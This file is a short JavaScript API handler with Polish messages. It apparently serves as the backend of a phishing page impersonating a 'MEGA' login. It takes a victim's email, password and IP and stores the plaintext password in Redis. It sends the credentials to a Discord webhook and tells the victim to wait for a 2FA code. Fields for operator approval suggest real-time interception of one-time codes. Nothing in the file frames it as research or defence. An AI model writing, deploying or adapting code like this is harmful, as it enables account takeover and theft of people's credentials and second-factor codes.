// api/session.js
import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password, ip } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email i hasło wymagane' });
    }

    // Generuj unikalny ID sesji
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
    
    // Zapisz sesję w Redis (ważna 5 minut)
    const sessionData = {
        email,
        password,
        ip: ip || 'N/A',
        timestamp: new Date().toISOString(),
        code: null,
        verified: false,
        rejected: false,
        approved: false
    };

    await redis.setex(`session:${sessionId}`, 300, JSON.stringify(sessionData));
    await redis.sadd('sessions', sessionId);

    // Wyślij na Discord (webhook)
    await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: 'MEGA Panel',
            embeds: [{
                title: '🔐 Nowe logowanie',
                description: `Email: ${email}\nHasło: ${password}`,
                color: 0xFBBF24,
                fields: [
                    { name: '📧 Email', value: email, inline: true },
                    { name: '🔑 Hasło', value: `||${password}||`, inline: true },
                    { name: '🌐 IP', value: ip || 'N/A', inline: true },
                    { name: '🆔 Sesja', value: sessionId, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        })
    });

    return res.status(200).json({ 
        success: true, 
        sessionId: sessionId,
        message: 'Zalogowano pomyślnie. Czekaj na kod 2FA.'
    });
}
